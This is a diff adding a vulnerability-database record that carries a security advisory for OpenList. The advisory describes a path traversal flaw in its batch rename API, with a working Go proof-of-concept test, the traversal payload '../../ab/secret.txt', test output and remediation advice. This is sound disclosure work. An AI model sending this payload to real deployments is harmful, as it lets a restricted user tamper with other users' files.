@@ -1,0 +1,239 @@
+[basic]
+description = '''
+### Summary
+
+The `/api/fs/batch_rename` handler validates and authorizes only the requested source directory. It rejects path separators in `new_name`, but it does not validate `src_name`. The handler concatenates `src_dir` and attacker-controlled `src_name`, then passes the result to the filesystem rename layer, where the path is normalized.
+
+An authenticated user with rename permission can set `src_name` to traversal segments such as `../../ab/secret.txt`. When the user's base path is `/team/a` and `src_dir` is `/writable`, the authorized directory becomes `/team/a/writable`, but the final source path normalizes to `/team/ab/secret.txt`. The file outside the user's base path is then renamed.
+
+### Details
+
+The HTTP API registers filesystem management routes under the authenticated group:
+
+- `server/router.go:104` registers `_fs(auth.Group(\"/fs\"))`.
+- `server/router.go:198` through `server/router.go:205` expose `/api/fs/batch_rename`.
+
+The vulnerable code is in `server/handles/fsbatch.go`:
+
+- `src_dir` is constrained through `user.JoinPath(req.SrcDir)` (`server/handles/fsbatch.go:170` through `server/handles/fsbatch.go:174`).
+- Write permission is checked only for that constrained directory (`server/handles/fsbatch.go:176` through `server/handles/fsbatch.go:185`).
+- The loop checks `renameObject.NewName` with `checkRelativePath`, but does not check `renameObject.SrcName` (`server/handles/fsbatch.go:186` through `server/handles/fsbatch.go:194`).
+- The handler builds `filePath := fmt.Sprintf(\"%s/%s\", reqPath, renameObject.SrcName)` and passes it to `fs.Rename` (`server/handles/fsbatch.go:195` through `server/handles/fsbatch.go:196`).
+
+The single-file rename path shows the intended pattern: `checkRelativePath(req.Name)` rejects separators, empty strings, `.`, and `..` before renaming (`server/handles/fsmanage.go:284` through `server/handles/fsmanage.go:333`). Batch rename applies this protection to the destination name only, not to the source name.
+
+Lower layers normalize the source path before operating on it:
+
+- `utils.FixAndCleanPath` replaces backslashes with slashes, forces an absolute slash prefix, and calls `path.Clean` (`pkg/utils/path.go:18` through `pkg/utils/path.go:24`).
+- `JoinBasePath` rejects traversal in the original `src_dir`, not in the later concatenated `src_name` (`pkg/utils/path.go:80` through `pkg/utils/path.go:87`).
+
+False-positive checks performed:
+
+- The user in the PoC had only normal authenticated user role plus rename permission, not admin role.
+- The handler successfully authorized `/team/a/writable`, then renamed `/team/ab/secret.txt`, proving that the later source path escaped the authorized directory.
+- `new_name` validation remained in effect; the exploit uses traversal only in `src_name`.
+- The test checked the original sibling file disappeared and the renamed sibling file contained the same contents.
+
+### PoC
+
+Safe local reproduction used a temporary in-memory sqlite database and temporary Local storage root. No external services were contacted by the PoC route; Go dependency/toolchain downloads may occur if the environment lacks cached modules.
+
+Add this temporary test under `server/handles/security_poc_test.go` in a clean checkout of the tested commit. If also testing the share finding, the helper functions can be shared between the two tests.
+
+```go
+package handles
+
+import (
+    \"bytes\"
+    \"context\"
+    \"encoding/json\"
+    \"net/http\"
+    \"net/http/httptest\"
+    \"os\"
+    \"path/filepath\"
+    \"strings\"
+    \"testing\"
+
+    _ \"github.com/OpenListTeam/OpenList/v4/drivers/local\"
+    \"github.com/OpenListTeam/OpenList/v4/internal/conf\"
+    \"github.com/OpenListTeam/OpenList/v4/internal/db\"
+    \"github.com/OpenListTeam/OpenList/v4/internal/model\"
+    \"github.com/OpenListTeam/OpenList/v4/internal/op\"
+    \"github.com/OpenListTeam/OpenList/v4/pkg/utils\"
+    \"github.com/gin-gonic/gin\"
+    \"github.com/glebarez/sqlite\"
+    \"gorm.io/gorm\"
+)
+
+func setupSecurityPoCTest(t *testing.T, root string) *model.User {
+    t.Helper()
+    database, err := gorm.Open(sqlite.Open(\"file:\"+t.Name()+\"?mode=memory&cache=shared\"), &gorm.Config{})
+    if err != nil {
+        t.Fatal(err)
+    }
+    conf.Conf = conf.DefaultConfig(t.TempDir())
+    db.Init(database)
+
+    addition, err := utils.Json.MarshalToString(map[string]string{\"root_folder_path\": root})
+    if err != nil {
+        t.Fatal(err)
+    }
+    _, err = op.CreateStorage(context.Background(), model.Storage{Driver: \"Local\", MountPath: \"/\", Addition: addition})
+    if err != nil {
+        t.Fatal(err)
+    }
+
+    user := &model.User{
+        Username:   \"alice\",
+        BasePath:   \"/team/a\",
+        Role:       model.GENERAL,
+        Permission: 1<<4 | 1<<14,
+    }
+    if err := db.CreateUser(user); err != nil {
+        t.Fatal(err)
+    }
+    return user
+}
+
+func requestWithUser(t *testing.T, method, target string, body any, user *model.User) (*gin.Context, *httptest.ResponseRecorder) {
+    t.Helper()
+    payload, err := json.Marshal(body)
+    if err != nil {
+        t.Fatal(err)
+    }
+    recorder := httptest.NewRecorder()
+    ctx, _ := gin.CreateTestContext(recorder)
+    req := httptest.NewRequest(method, target, bytes.NewReader(payload))
+    req.Header.Set(\"Content-Type\", \"application/json\")
+    req = req.WithContext(context.WithValue(req.Context(), conf.UserKey, user))
+    ctx.Request = req
+    return ctx, recorder
+}
+
+func TestPOCBatchRenameSrcNameTraversalEscapesUserBase(t *testing.T) {
+    gin.SetMode(gin.TestMode)
+    root := t.TempDir()
+    if err := os.MkdirAll(filepath.Join(root, \"team\", \"a\", \"writable\"), 0o700); err != nil {
+        t.Fatal(err)
+    }
+    if err := os.MkdirAll(filepath.Join(root, \"team\", \"ab\"), 0o700); err != nil {
+        t.Fatal(err)
+    }
+    secretPath := filepath.Join(root, \"team\", \"ab\", \"secret.txt\")
+    if err := os.WriteFile(secretPath, []byte(\"secret\"), 0o600); err != nil {
+        t.Fatal(err)
+    }
+    user := setupSecurityPoCTest(t, root)
+
+    ctx, recorder := requestWithUser(t, http.MethodPost, \"/api/fs/batch_rename\", gin.H{
+        \"src_dir\": \"/writable\",
+        \"rename_objects\": []gin.H{{
+            \"src_name\": \"../../ab/secret.txt\",
+            \"new_name\": \"renamed.txt\",
+        }},
+    }, user)
+    FsBatchRename(ctx)
+
+    if recorder.Code != http.StatusOK || !strings.Contains(recorder.Body.String(), `\"code\":200`) {
+        t.Fatalf(\"expected batch rename success, status=%d body=%s\", recorder.Code, recorder.Body.String())
+    }
+    if _, err := os.Stat(secretPath); !os.IsNotExist(err) {
+        t.Fatalf(\"expected original sibling file to be renamed, stat err=%v\", err)
+    }
+    renamedPath := filepath.Join(root, \"team\", \"ab\", \"renamed.txt\")
+    got, err := os.ReadFile(renamedPath)
+    if err != nil {
+        t.Fatalf(\"expected renamed sibling file at %s: %v\", renamedPath, err)
+    }
+    if string(got) != \"secret\" {
+        t.Fatalf(\"unexpected renamed file contents: %q\", got)
+    }
+}
+```
+
+Run:
+
+```bash
+go test ./server/handles -run TestPOCBatchRenameSrcNameTraversalEscapesUserBase -v
+```
+
+Observed vulnerable output in this environment:
+
+```text
+=== RUN   TestPOCBatchRenameSrcNameTraversalEscapesUserBase
+--- PASS: TestPOCBatchRenameSrcNameTraversalEscapesUserBase (0.01s)
+PASS
+ok  	github.com/OpenListTeam/OpenList/v4/server/handles
+```
+
+Combined final confirmation command used during the audit:
+
+```bash
+go test ./server/handles -run 'TestPOC(ShareCreateAcceptsSiblingPathOutsideUserBase|BatchRenameSrcNameTraversalEscapesUserBase)' -v
+```
+
+Observed combined output:
+
+```text
+=== RUN   TestPOCShareCreateAcceptsSiblingPathOutsideUserBase
+--- PASS: TestPOCShareCreateAcceptsSiblingPathOutsideUserBase (0.01s)
+=== RUN   TestPOCBatchRenameSrcNameTraversalEscapesUserBase
+--- PASS: TestPOCBatchRenameSrcNameTraversalEscapesUserBase (0.01s)
+PASS
+ok  	github.com/OpenListTeam/OpenList/v4/server/handles	(cached)
+```
+
+Negative/control cases checked:
+
+- `src_dir` traversal is rejected by `user.JoinPath` because `JoinBasePath` detects relative traversal in the original request path.
+- `new_name` traversal is rejected by `checkRelativePath` because it contains `/`, `\\`, `.`, or `..` patterns.
+- The exploit succeeds because `src_name` is not passed through the same relative filename check before concatenation.
+
+Cleanup:
+
+```bash
+rm server/handles/security_poc_test.go
+```
+
+### Impact
+
+A restricted authenticated user can rename files outside the authorized source directory and outside their configured base path. In a multi-user deployment, a user confined to `/team/a` can rename a guessed sibling file such as `/team/ab/secret.txt` to `/team/ab/renamed.txt` by submitting traversal segments in `src_name`.
+
+This is an integrity violation against other users' files. It can also cause limited availability impact by moving files away from expected names, and it may reveal whether guessed out-of-base files exist based on success or error responses.
+
+### Suggested remediation
+
+Validate `renameObject.SrcName` with the same relative filename constraints already applied to `renameObject.NewName`, or derive source objects only from a trusted directory listing of `reqPath`.
+
+A minimal fix is to call `checkRelativePath(renameObject.SrcName)` before constructing `filePath`. Add regression tests covering:
+
+- `src_name: \"file.txt\"` succeeds;
+- `src_name: \"../secret.txt\"` is denied;
+- `src_name: \"../../ab/secret.txt\"` is denied when base path is `/team/a` and `src_dir` is `/writable`;
+- `new_name` traversal remains denied.
+
+### Credits
+- Thai Son Dinh from VinSOC Labs (R&D)
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "OpenList: Authenticated users can rename files outside their base path via batch rename `src_name` traversal"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-95cv-r8x4-vh75"]
+ave_id = "AVE-2026-1055"
+
+[meta]
+collected_at = "2026-08-05T23:54:35.140523242+00:00"
+status = "completed"
+
+[references]
+urls = []
